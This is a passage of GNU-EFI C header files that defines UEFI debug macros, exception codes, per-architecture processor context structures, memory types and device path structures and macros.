#define EFI_MENU_KEY_PRESSED                       0x00000100
#define EFI_SYS_REQ_PRESSED                        0x00000200

// Toggle states
#define EFI_TOGGLE_STATE_VALID                     0x80
#define EFI_KEY_STATE_EXPOSED                      0x40
#define EFI_SCROLL_LOCK_ACTIVE                     0x01
#define EFI_NUM_LOCK_ACTIVE                        0x02
#define EFI_CAPS_LOCK_ACTIVE                       0x04

typedef
EFI_STATUS
(EFIAPI *EFI_INPUT_RESET_EX) (
    IN struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL   *This,
    IN BOOLEAN                                     ExtendedVerification
    );

typedef
EFI_STATUS
(EFIAPI *EFI_INPUT_READ_KEY_EX) (
    IN struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL   *This,
    OUT EFI_KEY_DATA                               *KeyData
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SET_STATE) (
    IN struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL   *This,
    IN EFI_KEY_TOGGLE_STATE                        *KeyToggleState
    );

typedef
EFI_STATUS
(EFIAPI *EFI_KEY_NOTIFY_FUNCTION) (
    IN EFI_KEY_DATA                                *KeyData
    );

typedef
EFI_STATUS
(EFIAPI *EFI_REGISTER_KEYSTROKE_NOTIFY) (
    IN struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL   *This,
    IN EFI_KEY_DATA                                *KeyData,
    IN EFI_KEY_NOTIFY_FUNCTION                     KeyNotificationFunction,
    OUT VOID                                       **NotifyHandle
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UNREGISTER_KEYSTROKE_NOTIFY) (
    IN struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL   *This,
    IN VOID                                        *NotificationHandle
    );

typedef struct _EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL{
    EFI_INPUT_RESET_EX                             Reset;
    EFI_INPUT_READ_KEY_EX                          ReadKeyStrokeEx;
    EFI_EVENT                                      WaitForKeyEx;
    EFI_SET_STATE                                  SetState;
    EFI_REGISTER_KEYSTROKE_NOTIFY                  RegisterKeyNotify;
    EFI_UNREGISTER_KEYSTROKE_NOTIFY                UnregisterKeyNotify;
} EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL;

#endif

```

`include/gnu-efi/efidebug.h`:

```h
#ifndef _EFI_DEBUG_H
#define _EFI_DEBUG_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efidebug.h

Abstract:

    EFI library debug functions



Revision History

--*/

extern UINTN     EFIDebug;

#if EFI_DEBUG

    #define DBGASSERT(a)        DbgAssert(__FILE__, __LINE__, #a)
    #define DEBUG(a)            DbgPrint a
    
#else

    #define DBGASSERT(a)
    #define DEBUG(a)
    
#endif

#if EFI_DEBUG_CLEAR_MEMORY

    #define DBGSETMEM(a,l)      SetMem(a,l,(CHAR8)BAD_POINTER)

#else

    #define DBGSETMEM(a,l)

#endif

#define D_INIT        0x00000001          // Initialization style messages
#define D_WARN        0x00000002          // Warnings
#define D_LOAD        0x00000004          // Load events
#define D_FS          0x00000008          // EFI File system
#define D_POOL        0x00000010          // Alloc & Free's
#define D_PAGE        0x00000020          // Alloc & Free's
#define D_INFO        0x00000040          // Verbose
#define D_VAR         0x00000100          // Variable
#define D_PARSE       0x00000200          // Command parsing
#define D_BM          0x00000400          // Boot manager
#define D_BLKIO       0x00001000          // BlkIo Driver
#define D_BLKIO_ULTRA 0x00002000          // BlkIo Driver
#define D_NET         0x00004000          // SNI Driver
#define D_NET_ULTRA   0x00008000          // SNI Driver
#define D_TXTIN       0x00010000          // Simple Input Driver
#define D_TXTOUT      0x00020000          // Simple Text Output Driver
#define D_ERROR_ATA	  0x00040000		  		// ATA error messages 
#define D_ERROR       0x80000000          // Error

#define D_RESERVED    0x7fffC880          // Bits not reserved above

//
// Current Debug level of the system, value of EFIDebug
//
//#define EFI_DBUG_MASK   (D_ERROR | D_WARN | D_LOAD | D_BLKIO | D_INIT)
#define EFI_DBUG_MASK   (D_ERROR)

//
//
//

#if EFI_DEBUG

    #define ASSERT(a)               if(!(a))       DBGASSERT(a)
    #define ASSERT_LOCKED(l)        if(!(l)->Lock) DBGASSERT(l not locked)
    #define ASSERT_STRUCT(p,t)      DBGASSERT(t not structure), p

#else

    #define ASSERT(a)               
    #define ASSERT_LOCKED(l)        
    #define ASSERT_STRUCT(p,t)      

#endif

//
// Prototypes
//

INTN
DbgAssert (
    CONST CHAR8   *file,
    INTN          lineno,
    CONST CHAR8   *string
    );

INTN
DbgPrint (
    INTN          mask,
    CONST CHAR8   *format,
    ...
    );

//
// Instruction Set Architectures definitions for debuggers
//

typedef INTN EFI_EXCEPTION_TYPE;

// IA32
#define EXCEPT_IA32_DIVIDE_ERROR    0
#define EXCEPT_IA32_DEBUG           1
#define EXCEPT_IA32_NMI             2
#define EXCEPT_IA32_BREAKPOINT      3
#define EXCEPT_IA32_OVERFLOW        4
#define EXCEPT_IA32_BOUND           5
#define EXCEPT_IA32_INVALID_OPCODE  6
#define EXCEPT_IA32_DOUBLE_FAULT    8
#define EXCEPT_IA32_INVALID_TSS     10
#define EXCEPT_IA32_SEG_NOT_PRESENT 11
#define EXCEPT_IA32_STACK_FAULT     12
#define EXCEPT_IA32_GP_FAULT        13
#define EXCEPT_IA32_PAGE_FAULT      14
#define EXCEPT_IA32_FP_ERROR        16
#define EXCEPT_IA32_ALIGNMENT_CHECK 17
#define EXCEPT_IA32_MACHINE_CHECK   18
#define EXCEPT_IA32_SIMD            19

typedef struct {
    UINT16  Fcw;
    UINT16  Fsw;
    UINT16  Ftw;
    UINT16  Opcode;
    UINT32  Eip;
    UINT16  Cs;
    UINT16  Reserved1;
    UINT32  DataOffset;
    UINT16  Ds;
    UINT8   Reserved2[10];
    UINT8   St0Mm0[10], Reserved3[6];
    UINT8   St1Mm1[10], Reserved4[6];
    UINT8   St2Mm2[10], Reserved5[6];
    UINT8   St3Mm3[10], Reserved6[6];
    UINT8   St4Mm4[10], Reserved7[6];
    UINT8   St5Mm5[10], Reserved8[6];
    UINT8   St6Mm6[10], Reserved9[6];
    UINT8   St7Mm7[10], Reserved10[6];
    UINT8   Xmm0[16];
    UINT8   Xmm1[16];
    UINT8   Xmm2[16];
    UINT8   Xmm3[16];
    UINT8   Xmm4[16];
    UINT8   Xmm5[16];
    UINT8   Xmm6[16];
    UINT8   Xmm7[16];
    UINT8   Reserved11[14 * 16];
} EFI_FX_SAVE_STATE_IA32;

typedef struct {
    UINT32                 ExceptionData;
    EFI_FX_SAVE_STATE_IA32 FxSaveState;
    UINT32                 Dr0;
    UINT32                 Dr1;
    UINT32                 Dr2;
    UINT32                 Dr3;
    UINT32                 Dr6;
    UINT32                 Dr7;
    UINT32                 Cr0;
    UINT32                 Cr1;
    UINT32                 Cr2;
    UINT32                 Cr3;
    UINT32                 Cr4;
    UINT32                 Eflags;
    UINT32                 Ldtr;
    UINT32                 Tr;
    UINT32                 Gdtr[2];
    UINT32                 Idtr[2];
    UINT32                 Eip;
    UINT32                 Gs;
    UINT32                 Fs;
    UINT32                 Es;
    UINT32                 Ds;
    UINT32                 Cs;
    UINT32                 Ss;
    UINT32                 Edi;
    UINT32                 Esi;
    UINT32                 Ebp;
    UINT32                 Esp;
    UINT32                 Ebx;
    UINT32                 Edx;
    UINT32                 Ecx;
    UINT32                 Eax;
} EFI_SYSTEM_CONTEXT_IA32;

// X64
#define EXCEPT_X64_DIVIDE_ERROR    0
#define EXCEPT_X64_DEBUG           1
#define EXCEPT_X64_NMI             2
#define EXCEPT_X64_BREAKPOINT      3
#define EXCEPT_X64_OVERFLOW        4
#define EXCEPT_X64_BOUND           5
#define EXCEPT_X64_INVALID_OPCODE  6
#define EXCEPT_X64_DOUBLE_FAULT    8
#define EXCEPT_X64_INVALID_TSS     10
#define EXCEPT_X64_SEG_NOT_PRESENT 11
#define EXCEPT_X64_STACK_FAULT     12
#define EXCEPT_X64_GP_FAULT        13
#define EXCEPT_X64_PAGE_FAULT      14
#define EXCEPT_X64_FP_ERROR        16
#define EXCEPT_X64_ALIGNMENT_CHECK 17
#define EXCEPT_X64_MACHINE_CHECK   18
#define EXCEPT_X64_SIMD            19

typedef struct {
    UINT16  Fcw;
    UINT16  Fsw;
    UINT16  Ftw;
    UINT16  Opcode;
    UINT64  Rip;
    UINT64  DataOffset;
    UINT8   Reserved1[8];
    UINT8   St0Mm0[10], Reserved2[6];
    UINT8   St1Mm1[10], Reserved3[6];
    UINT8   St2Mm2[10], Reserved4[6];
    UINT8   St3Mm3[10], Reserved5[6];
    UINT8   St4Mm4[10], Reserved6[6];
    UINT8   St5Mm5[10], Reserved7[6];
    UINT8   St6Mm6[10], Reserved8[6];
    UINT8   St7Mm7[10], Reserved9[6];
    UINT8   Xmm0[16];
    UINT8   Xmm1[16];
    UINT8   Xmm2[16];
    UINT8   Xmm3[16];
    UINT8   Xmm4[16];
    UINT8   Xmm5[16];
    UINT8   Xmm6[16];
    UINT8   Xmm7[16];
    UINT8   Reserved11[14 * 16];
} EFI_FX_SAVE_STATE_X64;

typedef struct {
    UINT64                ExceptionData;
    EFI_FX_SAVE_STATE_X64 FxSaveState;
    UINT64                Dr0;
    UINT64                Dr1;
    UINT64                Dr2;
    UINT64                Dr3;
    UINT64                Dr6;
    UINT64                Dr7;
    UINT64                Cr0;
    UINT64                Cr1;
    UINT64                Cr2;
    UINT64                Cr3;
    UINT64                Cr4;
    UINT64                Cr8;
    UINT64                Rflags;
    UINT64                Ldtr;
    UINT64                Tr;
    UINT64                Gdtr[2];
    UINT64                Idtr[2];
    UINT64                Rip;
    UINT64                Gs;
    UINT64                Fs;
    UINT64                Es;
    UINT64                Ds;
    UINT64                Cs;
    UINT64                Ss;
    UINT64                Rdi;
    UINT64                Rsi;
    UINT64                Rbp;
    UINT64                Rsp;
    UINT64                Rbx;
    UINT64                Rdx;
    UINT64                Rcx;
    UINT64                Rax;
    UINT64                R8;
    UINT64                R9;
    UINT64                R10;
    UINT64                R11;
    UINT64                R12;
    UINT64                R13;
    UINT64                R14;
    UINT64                R15;
} EFI_SYSTEM_CONTEXT_X64;

/// IA64
#define EXCEPT_IPF_VHTP_TRANSLATION               0
#define EXCEPT_IPF_INSTRUCTION_TLB                1
#define EXCEPT_IPF_DATA_TLB                       2
#define EXCEPT_IPF_ALT_INSTRUCTION_TLB            3
#define EXCEPT_IPF_ALT_DATA_TLB                   4
#define EXCEPT_IPF_DATA_NESTED_TLB                5
#define EXCEPT_IPF_INSTRUCTION_KEY_MISSED         6
#define EXCEPT_IPF_DATA_KEY_MISSED                7
#define EXCEPT_IPF_DIRTY_BIT                      8
#define EXCEPT_IPF_INSTRUCTION_ACCESS_BIT         9
#define EXCEPT_IPF_DATA_ACCESS_BIT                10
#define EXCEPT_IPF_BREAKPOINT                     11
#define EXCEPT_IPF_EXTERNAL_INTERRUPT             12
#define EXCEPT_IPF_PAGE_NOT_PRESENT               20
#define EXCEPT_IPF_KEY_PERMISSION                 21
#define EXCEPT_IPF_INSTRUCTION_ACCESS_RIGHTS      22
#define EXCEPT_IPF_DATA_ACCESS_RIGHTS             23
#define EXCEPT_IPF_GENERAL_EXCEPTION              24
#define EXCEPT_IPF_DISABLED_FP_REGISTER           25
#define EXCEPT_IPF_NAT_CONSUMPTION                26
#define EXCEPT_IPF_SPECULATION                    27
#define EXCEPT_IPF_DEBUG                          29
#define EXCEPT_IPF_UNALIGNED_REFERENCE            30
#define EXCEPT_IPF_UNSUPPORTED_DATA_REFERENCE     31
#define EXCEPT_IPF_FP_FAULT                       32
#define EXCEPT_IPF_FP_TRAP                        33
#define EXCEPT_IPF_LOWER_PRIVILEGE_TRANSFER_TRAP  34
#define EXCEPT_IPF_TAKEN_BRANCH                   35
#define EXCEPT_IPF_SINGLE_STEP                    36
#define EXCEPT_IPF_IA32_EXCEPTION                 45
#define EXCEPT_IPF_IA32_INTERCEPT                 46
#define EXCEPT_IPF_IA32_INTERRUPT                 47

typedef struct {
    UINT64  Reserved;
    UINT64  R1;
    UINT64  R2;
    UINT64  R3;
    UINT64  R4;
    UINT64  R5;
    UINT64  R6;
    UINT64  R7;
    UINT64  R8;
    UINT64  R9;
    UINT64  R10;
    UINT64  R11;
    UINT64  R12;
    UINT64  R13;
    UINT64  R14;
    UINT64  R15;
    UINT64  R16;
    UINT64  R17;
    UINT64  R18;
    UINT64  R19;
    UINT64  R20;
    UINT64  R21;
    UINT64  R22;
    UINT64  R23;
    UINT64  R24;
    UINT64  R25;
    UINT64  R26;
    UINT64  R27;
    UINT64  R28;
    UINT64  R29;
    UINT64  R30;
    UINT64  R31;
    UINT64  F2[2];
    UINT64  F3[2];
    UINT64  F4[2];
    UINT64  F5[2];
    UINT64  F6[2];
    UINT64  F7[2];
    UINT64  F8[2];
    UINT64  F9[2];
    UINT64  F10[2];
    UINT64  F11[2];
    UINT64  F12[2];
    UINT64  F13[2];
    UINT64  F14[2];
    UINT64  F15[2];
    UINT64  F16[2];
    UINT64  F17[2];
    UINT64  F18[2];
    UINT64  F19[2];
    UINT64  F20[2];
    UINT64  F21[2];
    UINT64  F22[2];
    UINT64  F23[2];
    UINT64  F24[2];
    UINT64  F25[2];
    UINT64  F26[2];
    UINT64  F27[2];
    UINT64  F28[2];
    UINT64  F29[2];
    UINT64  F30[2];
    UINT64  F31[2];
    UINT64  Pr;
    UINT64  B0;
    UINT64  B1;
    UINT64  B2;
    UINT64  B3;
    UINT64  B4;
    UINT64  B5;
    UINT64  B6;
    UINT64  B7;
    UINT64  ArRsc;
    UINT64  ArBsp;
    UINT64  ArBspstore;
    UINT64  ArRnat;
    UINT64  ArFcr;
    UINT64  ArEflag;
    UINT64  ArCsd;
    UINT64  ArSsd;
    UINT64  ArCflg;
    UINT64  ArFsr;
    UINT64  ArFir;
    UINT64  ArFdr;
    UINT64  ArCcv;
    UINT64  ArUnat;
    UINT64  ArFpsr;
    UINT64  ArPfs;
    UINT64  ArLc;
    UINT64  ArEc;
    UINT64  CrDcr;
    UINT64  CrItm;
    UINT64  CrIva;
    UINT64  CrPta;
    UINT64  CrIpsr;
    UINT64  CrIsr;
    UINT64  CrIip;
    UINT64  CrIfa;
    UINT64  CrItir;
    UINT64  CrIipa;
    UINT64  CrIfs;
    UINT64  CrIim;
    UINT64  CrIha;
    UINT64  Dbr0;
    UINT64  Dbr1;
    UINT64  Dbr2;
    UINT64  Dbr3;
    UINT64  Dbr4;
    UINT64  Dbr5;
    UINT64  Dbr6;
    UINT64  Dbr7;
    UINT64  Ibr0;
    UINT64  Ibr1;
    UINT64  Ibr2;
    UINT64  Ibr3;
    UINT64  Ibr4;
    UINT64  Ibr5;
    UINT64  Ibr6;
    UINT64  Ibr7;
    UINT64  IntNat;
} EFI_SYSTEM_CONTEXT_IPF;

// EBC
#define EXCEPT_EBC_UNDEFINED            0
#define EXCEPT_EBC_DIVIDE_ERROR         1
#define EXCEPT_EBC_DEBUG                2
#define EXCEPT_EBC_BREAKPOINT           3
#define EXCEPT_EBC_OVERFLOW             4
#define EXCEPT_EBC_INVALID_OPCODE       5
#define EXCEPT_EBC_STACK_FAULT          6
#define EXCEPT_EBC_ALIGNMENT_CHECK      7
#define EXCEPT_EBC_INSTRUCTION_ENCODING 8
#define EXCEPT_EBC_BAD_BREAK            9
#define EXCEPT_EBC_STEP                 10
#define MAX_EBC_EXCEPTION               EXCEPT_EBC_STEP

typedef struct {
    UINT64  R0;
    UINT64  R1;
    UINT64  R2;
    UINT64  R3;
    UINT64  R4;
    UINT64  R5;
    UINT64  R6;
    UINT64  R7;
    UINT64  Flags;
    UINT64  ControlFlags;
    UINT64  Ip;
} EFI_SYSTEM_CONTEXT_EBC;

// ARM
#define EXCEPT_ARM_RESET                    0
#define EXCEPT_ARM_UNDEFINED_INSTRUCTION    1
#define EXCEPT_ARM_SOFTWARE_INTERRUPT       2
#define EXCEPT_ARM_PREFETCH_ABORT           3
#define EXCEPT_ARM_DATA_ABORT               4
#define EXCEPT_ARM_RESERVED                 5
#define EXCEPT_ARM_IRQ                      6
#define EXCEPT_ARM_FIQ                      7
#define MAX_ARM_EXCEPTION                   EXCEPT_ARM_FIQ

typedef struct {
    UINT32  R0;
    UINT32  R1;
    UINT32  R2;
    UINT32  R3;
    UINT32  R4;
    UINT32  R5;
    UINT32  R6;
    UINT32  R7;
    UINT32  R8;
    UINT32  R9;
    UINT32  R10;
    UINT32  R11;
    UINT32  R12;
    UINT32  SP;
    UINT32  LR;
    UINT32  PC;
    UINT32  CPSR;
    UINT32  DFSR;
    UINT32  DFAR;
    UINT32  IFSR;
    UINT32  IFAR;
} EFI_SYSTEM_CONTEXT_ARM;


typedef union {
    EFI_SYSTEM_CONTEXT_EBC  *SystemContextEbc;
    EFI_SYSTEM_CONTEXT_IA32 *SystemContextIa32;
    EFI_SYSTEM_CONTEXT_X64  *SystemContextX64;
    EFI_SYSTEM_CONTEXT_IPF  *SystemContextIpf;
    EFI_SYSTEM_CONTEXT_ARM  *SystemContextArm;
} EFI_SYSTEM_CONTEXT;

typedef
VOID
(EFIAPI *EFI_EXCEPTION_CALLBACK)(
    IN     EFI_EXCEPTION_TYPE               ExceptionType,
    IN OUT EFI_SYSTEM_CONTEXT               SystemContext);

typedef
VOID
(EFIAPI *EFI_PERIODIC_CALLBACK)(
    IN OUT EFI_SYSTEM_CONTEXT               SystemContext);

typedef enum {
    IsaIa32 = EFI_IMAGE_MACHINE_IA32,
    IsaX64 = EFI_IMAGE_MACHINE_X64,
    IsaIpf = EFI_IMAGE_MACHINE_IA64,
    IsaEbc = EFI_IMAGE_MACHINE_EBC,
    IsaArm = EFI_IMAGE_MACHINE_ARMTHUMB_MIXED,
//	IsaArm64 = EFI_IMAGE_MACHINE_AARCH64
} EFI_INSTRUCTION_SET_ARCHITECTURE;

//
// DEBUG_IMAGE_INFO
//

#define EFI_DEBUG_IMAGE_INFO_TABLE_GUID \
    { 0x49152e77, 0x1ada, 0x4764, {0xb7, 0xa2, 0x7a, 0xfe, 0xfe, 0xd9, 0x5e, 0x8b} }

#define EFI_DEBUG_IMAGE_INFO_UPDATE_IN_PROGRESS 0x01
#define EFI_DEBUG_IMAGE_INFO_TABLE_MODIFIED     0x02
#define EFI_DEBUG_IMAGE_INFO_INITIAL_SIZE       (EFI_PAGE_SIZE / sizeof (UINTN))
#define EFI_DEBUG_IMAGE_INFO_TYPE_NORMAL        0x01

typedef struct {
UINT64                Signature;
EFI_PHYSICAL_ADDRESS  EfiSystemTableBase;
UINT32                Crc32;
} EFI_SYSTEM_TABLE_POINTER;

typedef struct {
UINT32                    ImageInfoType;
EFI_LOADED_IMAGE_PROTOCOL *LoadedImageProtocolInstance;
EFI_HANDLE                *ImageHandle;
} EFI_DEBUG_IMAGE_INFO_NORMAL;

typedef union {
UINT32                      *ImageInfoType;
EFI_DEBUG_IMAGE_INFO_NORMAL *NormalImage;
} EFI_DEBUG_IMAGE_INFO;

typedef struct {
volatile UINT32       UpdateStatus;
UINT32                TableSize;
EFI_DEBUG_IMAGE_INFO  *EfiDebugImageInfoTable;
} EFI_DEBUG_IMAGE_INFO_TABLE_HEADER;

//
// EFI_DEBUGGER_PROTOCOL
//

#define EFI_DEBUG_SUPPORT_PROTOCOL_GUID \
    { 0x2755590c, 0x6f3c, 0x42fa, {0x9e, 0xa4, 0xa3, 0xba, 0x54, 0x3c, 0xda, 0x25} }

INTERFACE_DECL(_EFI_DEBUG_SUPPORT_PROTOCOL);

typedef
EFI_STATUS
(EFIAPI *EFI_GET_MAXIMUM_PROCESSOR_INDEX)(
    IN struct _EFI_DEBUG_SUPPORT_PROTOCOL  *This,
    OUT UINTN                              *MaxProcessorIndex);

typedef
EFI_STATUS
(EFIAPI *EFI_REGISTER_PERIODIC_CALLBACK)(
    IN struct _EFI_DEBUG_SUPPORT_PROTOCOL  *This,
    IN UINTN                               ProcessorIndex,
    IN EFI_PERIODIC_CALLBACK               PeriodicCallback);

typedef
EFI_STATUS
(EFIAPI *EFI_REGISTER_EXCEPTION_CALLBACK)(
    IN struct _EFI_DEBUG_SUPPORT_PROTOCOL  *This,
    IN UINTN                               ProcessorIndex,
    IN EFI_EXCEPTION_CALLBACK              ExceptionCallback,
    IN EFI_EXCEPTION_TYPE                  ExceptionType);

typedef
EFI_STATUS
(EFIAPI *EFI_INVALIDATE_INSTRUCTION_CACHE)(
    IN struct _EFI_DEBUG_SUPPORT_PROTOCOL  *This,
    IN UINTN                               ProcessorIndex,
    IN VOID                                *Start,
    IN UINT64                              Length);

typedef struct _EFI_DEBUG_SUPPORT_PROTOCOL {
    EFI_INSTRUCTION_SET_ARCHITECTURE  Isa;
    EFI_GET_MAXIMUM_PROCESSOR_INDEX   GetMaximumProcessorIndex;
    EFI_REGISTER_PERIODIC_CALLBACK    RegisterPeriodicCallback;
    EFI_REGISTER_EXCEPTION_CALLBACK   RegisterExceptionCallback;
    EFI_INVALIDATE_INSTRUCTION_CACHE  InvalidateInstructionCache;
} EFI_DEBUG_SUPPORT_PROTOCOL;

#endif

```

`include/gnu-efi/efidef.h`:

```h
#ifndef _EFI_DEF_H
#define _EFI_DEF_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efidef.h

Abstract:

    EFI definitions




Revision History

--*/

typedef UINT16          CHAR16;
typedef UINT8           CHAR8;
typedef UINT8           BOOLEAN;
#ifndef CONST
   #define CONST const
#endif
#ifndef TRUE
    #define TRUE    ((BOOLEAN) 1)
    #define FALSE   ((BOOLEAN) 0)
#endif

#ifndef NULL
    #define NULL    ((VOID *) 0)
#endif

typedef UINTN           EFI_STATUS;
typedef UINT64          EFI_LBA;
typedef UINTN           EFI_TPL;
typedef VOID            *EFI_HANDLE;
typedef VOID            *EFI_EVENT;


//
// Prototype argument decoration for EFI parameters to indicate
// their direction
//
// IN - argument is passed into the function
// OUT - argument (pointer) is returned from the function
// OPTIONAL - argument is optional
//

#ifndef IN
    #define IN
    #define OUT
    #define OPTIONAL
#endif


//
// A GUID
//

typedef struct {          
    UINT32  Data1;
    UINT16  Data2;
    UINT16  Data3;
    UINT8   Data4[8]; 
} EFI_GUID;


//
// Time
//

typedef struct {          
    UINT16      Year;       // 1998 - 20XX
    UINT8       Month;      // 1 - 12
    UINT8       Day;        // 1 - 31
    UINT8       Hour;       // 0 - 23
    UINT8       Minute;     // 0 - 59
    UINT8       Second;     // 0 - 59
    UINT8       Pad1;
    UINT32      Nanosecond; // 0 - 999,999,999
    INT16       TimeZone;   // -1440 to 1440 or 2047
    UINT8       Daylight;
    UINT8       Pad2;
} EFI_TIME;

// Bit definitions for EFI_TIME.Daylight
#define EFI_TIME_ADJUST_DAYLIGHT    0x01
#define EFI_TIME_IN_DAYLIGHT        0x02

// Value definition for EFI_TIME.TimeZone
#define EFI_UNSPECIFIED_TIMEZONE    0x07FF



//
// Networking
//

typedef struct {
    UINT8                   Addr[4];
} EFI_IPv4_ADDRESS;

typedef struct {
    UINT8                   Addr[16];
} EFI_IPv6_ADDRESS;

typedef struct {
    UINT8                   Addr[32];
} EFI_MAC_ADDRESS;

typedef struct {
    UINT32 ReceivedQueueTimeoutValue;
    UINT32 TransmitQueueTimeoutValue;
    UINT16 ProtocolTypeFilter;
    BOOLEAN EnableUnicastReceive;
    BOOLEAN EnableMulticastReceive;
    BOOLEAN EnableBroadcastReceive;
    BOOLEAN EnablePromiscuousReceive;
    BOOLEAN FlushQueuesOnReset;
    BOOLEAN EnableReceiveTimestamps;
    BOOLEAN DisableBackgroundPolling;
} EFI_MANAGED_NETWORK_CONFIG_DATA;

//
// Memory
//

typedef UINT64          EFI_PHYSICAL_ADDRESS;
typedef UINT64          EFI_VIRTUAL_ADDRESS;

typedef enum {
    AllocateAnyPages,
    AllocateMaxAddress,
    AllocateAddress,
    MaxAllocateType
} EFI_ALLOCATE_TYPE;

//Preseve the attr on any range supplied.
//ConventialMemory must have WB,SR,SW when supplied.
//When allocating from ConventialMemory always make it WB,SR,SW
//When returning to ConventialMemory always make it WB,SR,SW
//When getting the memory map, or on RT for runtime types


typedef enum {
    EfiReservedMemoryType,
    EfiLoaderCode,
    EfiLoaderData,
    EfiBootServicesCode,
    EfiBootServicesData,
    EfiRuntimeServicesCode,
    EfiRuntimeServicesData,
    EfiConventionalMemory,
    EfiUnusableMemory,
    EfiACPIReclaimMemory,
    EfiACPIMemoryNVS,
    EfiMemoryMappedIO,
    EfiMemoryMappedIOPortSpace,
    EfiPalCode,
    EfiMaxMemoryType
} EFI_MEMORY_TYPE;

// possible caching types for the memory range
#define EFI_MEMORY_UC           0x0000000000000001
#define EFI_MEMORY_WC           0x0000000000000002
#define EFI_MEMORY_WT           0x0000000000000004
#define EFI_MEMORY_WB           0x0000000000000008
#define EFI_MEMORY_UCE          0x0000000000000010  

// physical memory protection on range 
#define EFI_MEMORY_WP           0x0000000000001000
#define EFI_MEMORY_RP           0x0000000000002000
#define EFI_MEMORY_XP           0x0000000000004000

// range requires a runtime mapping
#define EFI_MEMORY_RUNTIME      0x8000000000000000

#define EFI_MEMORY_DESCRIPTOR_VERSION  1
typedef struct {
    UINT32                          Type;           // Field size is 32 bits followed by 32 bit pad
    UINT32                          Pad;
    EFI_PHYSICAL_ADDRESS            PhysicalStart;  // Field size is 64 bits
    EFI_VIRTUAL_ADDRESS             VirtualStart;   // Field size is 64 bits
    UINT64                          NumberOfPages;  // Field size is 64 bits
    UINT64                          Attribute;      // Field size is 64 bits
} EFI_MEMORY_DESCRIPTOR;

//
// International Language
//

typedef UINT8   ISO_639_2;
#define ISO_639_2_ENTRY_SIZE    3

//
//
//

#define EFI_PAGE_SIZE   4096
#define EFI_PAGE_MASK   0xFFF
#define EFI_PAGE_SHIFT  12

#define EFI_SIZE_TO_PAGES(a)  \
    ( ((a) >> EFI_PAGE_SHIFT) + ((a) & EFI_PAGE_MASK ? 1 : 0) )

#define EFI_OS_INDICATIONS_BOOT_TO_FW_UI        0x0000000000000001
#define EFI_OS_INDICATIONS_TIMESTAMP_REVOCATION 0x0000000000000002
#define EFI_OS_INDICATIONS_FILE_CAPSULE_DELIVERY_SUPPORTED \
                                                0x0000000000000004
#define EFI_OS_INDICATIONS_FMP_CAPSULE_SUPPORTED \
                                                0x0000000000000008
#define EFI_OS_INDICATIONS_CAPSULE_RESULT_VAR_SUPPORTED \
                                                0x0000000000000010

#endif

```

`include/gnu-efi/efidevp.h`:

```h
#ifndef _DEVPATH_H
#define _DEVPATH_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    devpath.h

Abstract:

    Defines for parsing the EFI Device Path structures



Revision History

--*/

//
// Device Path structures - Section C
//

typedef struct _EFI_DEVICE_PATH_PROTOCOL {
        UINT8                           Type;
        UINT8                           SubType;
        UINT8                           Length[2];
} EFI_DEVICE_PATH_PROTOCOL;

typedef struct _EFI_DEVICE_PATH_PROTOCOL _EFI_DEVICE_PATH;
typedef EFI_DEVICE_PATH_PROTOCOL EFI_DEVICE_PATH;

#define EFI_DP_TYPE_MASK                    0x7F
#define EFI_DP_TYPE_UNPACKED                0x80

//#define END_DEVICE_PATH_TYPE                0xff
#define END_DEVICE_PATH_TYPE                0x7f
//#define END_DEVICE_PATH_TYPE_UNPACKED       0x7f

#define END_ENTIRE_DEVICE_PATH_SUBTYPE      0xff
#define END_INSTANCE_DEVICE_PATH_SUBTYPE    0x01
#define END_DEVICE_PATH_LENGTH              (sizeof(EFI_DEVICE_PATH_PROTOCOL))


#define DP_IS_END_TYPE(a)
#define DP_IS_END_SUBTYPE(a)        ( ((a)->SubType == END_ENTIRE_DEVICE_PATH_SUBTYPE )

#define DevicePathType(a)           ( ((a)->Type) & EFI_DP_TYPE_MASK )
#define DevicePathSubType(a)        ( (a)->SubType )
#define DevicePathNodeLength(a)     ( ((a)->Length[0]) | ((a)->Length[1] << 8) )
#define NextDevicePathNode(a)       ( (EFI_DEVICE_PATH_PROTOCOL *) ( ((UINT8 *) (a)) + DevicePathNodeLength(a)))
//#define IsDevicePathEndType(a)      ( DevicePathType(a) == END_DEVICE_PATH_TYPE_UNPACKED )
#define IsDevicePathEndType(a)      ( DevicePathType(a) == END_DEVICE_PATH_TYPE )
#define IsDevicePathEndSubType(a)   ( (a)->SubType == END_ENTIRE_DEVICE_PATH_SUBTYPE )
#define IsDevicePathEnd(a)          ( IsDevicePathEndType(a) && IsDevicePathEndSubType(a) )
#define IsDevicePathUnpacked(a)     ( (a)->Type & EFI_DP_TYPE_UNPACKED )


#define SetDevicePathNodeLength(a,l) {                  \
            (a)->Length[0] = (UINT8) (l);               \
            (a)->Length[1] = (UINT8) ((l) >> 8);        \
            }

#define SetDevicePathEndNode(a)  {                      \
            (a)->Type = END_DEVICE_PATH_TYPE;           \
            (a)->SubType = END_ENTIRE_DEVICE_PATH_SUBTYPE;     \
            (a)->Length[0] = sizeof(EFI_DEVICE_PATH_PROTOCOL); \
            (a)->Length[1] = 0;                         \
            }


/*
 * Hardware Device Path (UEFI 2.4 specification, version 2.4 § 9.3.2.)
 */

#define HARDWARE_DEVICE_PATH            0x01

#define HW_PCI_DP                       0x01
typedef struct _PCI_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT8                           Function;
        UINT8                           Device;
} PCI_DEVICE_PATH;

#define HW_PCCARD_DP                    0x02
typedef struct _PCCARD_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT8                           FunctionNumber ;
} PCCARD_DEVICE_PATH;

#define HW_MEMMAP_DP                    0x03
typedef struct _MEMMAP_DEVICE_PATH {
        EFI_DEVICE_PATH_PROTOCOL        Header;
        UINT32                          MemoryType;
        EFI_PHYSICAL_ADDRESS            StartingAddress;
        EFI_PHYSICAL_ADDRESS            EndingAddress;
